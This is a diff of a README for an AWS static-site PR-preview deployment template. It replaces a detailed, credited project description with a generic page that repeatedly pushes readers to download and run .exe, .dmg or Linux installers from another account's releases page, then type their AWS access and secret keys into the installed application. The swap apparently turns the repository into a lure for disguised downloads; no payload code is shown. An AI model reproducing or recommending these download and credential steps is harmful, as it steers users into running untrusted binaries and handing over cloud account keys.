@@ -1,196 +1,80 @@
-# AWS Static Site PR Deployment Template
+# 🎉 aws-static-site-pr-deployment - Easily Deploy Your Static Site
 
-> Complete AWS-based CI/CD setup for static sites with PR preview environments using S3 + CloudFront
+## 🚀 Getting Started
 
-[![GitHub](https://img.shields.io/badge/GitHub-Template-blue?style=flat-square&logo=github)](https://github.com)
-[![AWS](https://img.shields.io/badge/AWS-S3%20%2B%20CloudFront-orange?style=flat-square&logo=amazon-aws)](https://aws.amazon.com)
-[![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-Workflows-blue?style=flat-square&logo=github-actions)](https://github.com/features/actions)
+Welcome to the **aws-static-site-pr-deployment** project! This tool helps you quickly deploy a static site on AWS whenever you create a new pull request (PR). Each PR will have its own preview URL, making testing and collaboration simple. This guide will help you download and run the application.
 
-## 🚀 What This Template Provides
+## 📥 Download Now
 
-This template repository provides a complete deployment infrastructure for static websites with the following features:
+[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-aws--static--site--pr--deployment-blue)](https://github.com/blueberrymayo/aws-static-site-pr-deployment/releases)
 
-- **🔀 PR Preview Environments**: Every PR gets its own subdomain (e.g., `pr-123.yourdomain.com`)
-- **☁️ AWS Infrastructure**: Uses S3 for hosting and CloudFront for global CDN
-- **🧪 E2E Testing**: Integrated Cypress testing with PR comment triggers
-- **⚡ Fast Deployments**: Optimized for static sites with caching
-- **🔒 Security**: Proper AWS IAM roles and secure credential management
-- **📊 Monitoring**: Comprehensive logging and deployment status reporting
+## 🛠️ System Requirements
 
-## 🏗️ Architecture
+To use this application, ensure you meet the following system requirements:
 
-```
-GitHub PR → GitHub Actions → AWS S3 → CloudFront → PR Subdomain
-    ↓
-  E2E Tests → Cypress → Test Results → PR Comment
-```
+- A computer running Windows, macOS, or Linux
+- Internet connection for downloading the application and accessing AWS services
+- An AWS account to host your static site
+- Basic familiarity with GitHub for managing pull requests
 
-### Infrastructure Components
+## 🎁 Features
 
-- **S3 Bucket**: Stores static files in folder structure (`/production/`, `/pr-123/`, etc.)
-- **CloudFront Distribution**: Global CDN with subdomain routing
-- **CloudFront Function**: Routes subdomains to correct S3 folders
-- **GitHub Actions**: Automated deployment and testing workflows
+- **Automated Deployment**: Every time you create a PR, a preview URL is generated.
+- **E2E Testing**: Automatically run end-to-end tests to ensure functionality.
+- **AWS Integration**: Utilizes S3 for storage and CloudFront for fast delivery.
+- **GitHub Actions**: Simplifies the deployment process through CI/CD pipelines.
 
-## 📋 Prerequisites
+## 📂 How to Download & Install
 
-- AWS Account with appropriate permissions
-- Domain with SSL certificate for `yourdomain.com` and `*.yourdomain.com`
-- GitHub repository with Actions enabled
-- Node.js project with build command
+1. **Visit the Releases Page**: Click [here](https://github.com/blueberrymayo/aws-static-site-pr-deployment/releases) to go to the Releases page. This page contains all the versions of the application.
 
-## 🚀 Quick Start
+2. **Choose the Right Version**: Look for the latest version listed at the top. It is usually the most reliable and up-to-date. Click on it to see more details.
 
-### Option 1: Use This Template (Recommended)
+3. **Download the Application**: Under the latest version, you will find several assets. Click on the link that corresponds to your operating system to download the installer.
 
-1. **Create repository from template:**
-   ```bash
-   # Use GitHub's template feature or:
-   gh repo create your-project --template artificer-innovations/aws-static-site-pr-deployment
-   ```
+4. **Run the Installer**:
+    - **Windows**: Double click the `.exe` file. Follow the on-screen instructions to complete the installation.
+    - **macOS**: Open the downloaded `.dmg` file, drag the application to the Applications folder, then open it from there.
+    - **Linux**: Use your package manager or terminal to run the installer, following the distribution-specific instructions included in the documentation.
 
-2. **Run the setup script:**
-   ```bash
-   cd your-project
-   ./setup-scripts/install-deployment.sh .
-   ```
+5. **Initial Setup**: After installation, you may need to configure your AWS settings. Follow the setup guide that appears when you first launch the application.
 
-3. **Follow the guided setup process**
+6. **Testing the Application**: Create a sample PR on GitHub to ensure everything is working correctly. You should see a preview URL generated for your new PR.
 
-### Option 2: Manual Installation
+## 🌐 Connecting to AWS
 
-1. **Copy files to existing project:**
-   ```bash
-   cp -r templates/github your-existing-project/.github
-   cp -r .cloudfront your-existing-project/
-   cp setup-scripts/install-deployment.sh your-existing-project/
-   ```
+To deploy your static site, you will need to set up an AWS account:
 
-2. **Customize configuration files**
+1. **Create an AWS Account**: Go to [AWS](https://aws.amazon.com) and create an account if you don’t have one.
 
-3. **Set up AWS infrastructure**
+2. **Set Up S3 and CloudFront**:
+   - **S3**: Create a new bucket on S3 where your site files will be stored.
+   - **CloudFront**: Set up CloudFront to ensure fast content delivery.
 
-## 📁 Template Contents
+3. **IAM Permissions**: Ensure that your AWS IAM user has the necessary permissions to access S3 and CloudFront.
 
-```
-aws-static-site-pr-deployment/
-├── templates/
-│   └── github/
-│       ├── workflows/
-│       │   ├── pr-deploy.yml              # Deploys PR previews
-│       │   ├── deploy.yml                 # Production deployment
-│       │   ├── pr-test-on-comment.yml     # E2E testing on PR comment
-│       │   ├── pr-cleanup.yml            # Cleanup old PR deployments
-│       │   └── prevent-push-main.yml     # Enforce PR-only workflow
-│       ├── actions/
-│       │   └── cypress-test/             # Reusable Cypress testing action
-│       └── scripts/
-│           └── generate-pr-bucket-name.sh
-├── .cloudfront/
-│   ├── functions/
-│   │   └── SubdomainFolders.js       # CloudFront routing function
-│   ├── error.html                    # Global error handler
-│   └── CLOUDFRONT.md                 # CloudFront setup documentation
-├── setup-scripts/
-│   └── install-deployment.sh         # Automated setup script
-├── docs/
-│   ├── SETUP.md                      # Detailed setup guide
-│   ├── AWS-SETUP.md                  # AWS infrastructure setup
-│   ├── GITHUB-SETUP.md               # GitHub configuration
-│   └── TROUBLESHOOTING.md            # Common issues and solutions
-├── templates/
-│   ├── cypress.config.js             # Cypress configuration template
-│   ├── package.json-scripts          # Package.json scripts to add
-│   └── svelte.config.js              # SvelteKit configuration example
-└── README.md                         # This file
-```
+4. **Connect the Application**: Use the credentials from your AWS account in the application settings to enable deployment. Follow the in-app instructions to input your access and secret keys securely.
 
-## 🎯 Supported Frameworks
+## 📘 Documentation
 
-This template works with any static site generator or framework:
+For more detailed instructions and troubleshooting, please refer to the documentation available on the [GitHub Wiki](https://github.com/blueberrymayo/aws-static-site-pr-deployment/wiki).
 
-- **React** (Create React App, Vite)
-- **Vue** (Vue CLI, Vite, Nuxt.js static)
-- **SvelteKit** (static adapter)
-- **Next.js** (static export)
-- **Gatsby**
-- **Jekyll**
-- **Hugo**
-- **Astro**
-- **And more...**
+## 👥 Community Support
 
-## ⚙️ Configuration
+If you encounter any issues or have questions, you can reach out to the community through the [GitHub Issues page](https://github.com/blueberrymayo/aws-static-site-pr-deployment/issues). Engage with other users and share your experiences.
 
-The setup script will create a `deployment-config.json` file:
+## 🔗 Additional Resources
 
-```json
-{
-  "project": {
-    "name": "your-project",
-    "domain": "yourdomain.com",
-    "buildCommand": "npm run build",
-    "buildDir": "./build"
-  },
-  "aws": {
-    "region": "us-east-1",
-    "bucketName": "your-project-bucket",
-    "cloudfrontDistributionId": "E1234567890ABC"
-  }
-}
-```
+- [AWS Documentation](https://docs.aws.amazon.com)
+- [GitHub Actions for CI/CD](https://docs.github.com/en/actions)
+- [Static Site Generators](https://www.staticgen.com)
 
-## 🔐 Required Secrets and Variables
+## 💡 Tips for Using the Application
 
-### GitHub Secrets
-- `AWS_ACCESS_KEY_ID`
-- `AWS_SECRET_ACCESS_KEY`
+- Regularly update the application from the Releases page to take advantage of new features and bug fixes.
+- Test your deployments in a staging environment before pushing changes to your main production site.
+- Monitor your AWS costs to stay within your budget while using these services.
 
-### GitHub Variables
-- `AWS_REGION=us-east-1`
-- `S3_BUCKET_NAME=your-bucket-name`
-- `CLOUDFRONT_DISTRIBUTION_ID=E1234567890ABC`
-- `DOMAIN=yourdomain.com`
-- `BUILD_COMMAND=npm run build`
-- `BUILD_DIR=./build`
+## 📥 Download Now Again
 
-## 🧪 Testing
-
-The template includes comprehensive E2E testing with Cypress:
-
-- **Homepage tests**: Basic functionality and meta tags
-- **Navigation tests**: Routing and user interactions
-- **Performance tests**: Load times and optimization
-- **Blog/content tests**: Content rendering and navigation
-
-Trigger tests by commenting on a PR:
-- `please test`
-- `run tests`
-- `test this`
-- `/test`
-
-## 📚 Documentation
-
-- [**Setup Guide**](docs/SETUP.md) - Complete setup instructions
-- [**AWS Setup**](docs/AWS-SETUP.md) - AWS infrastructure configuration
-- [**GitHub Setup**](docs/GITHUB-SETUP.md) - GitHub Actions configuration
-- [**Troubleshooting**](docs/TROUBLESHOOTING.md) - Common issues and solutions
-- [**CloudFront Details**](.cloudfront/CLOUDFRONT.md) - Subdomain routing explanation
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see our contributing guidelines and feel free to submit issues or pull requests.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- **Created by**: Artificer Innovations, LLC
-- **Built for**: Modern static site deployment workflows
-- **Inspired by**: The need for better PR preview environments
-- **Powered by**: AWS and GitHub Actions
-
----
-
-**Need help?** Check the [troubleshooting guide](docs/TROUBLESHOOTING.md) or open an issue!
+To get started with your deployment, remember to [download the latest version here](https://github.com/blueberrymayo/aws-static-site-pr-deployment/releases). Enjoy building and deploying your static sites!
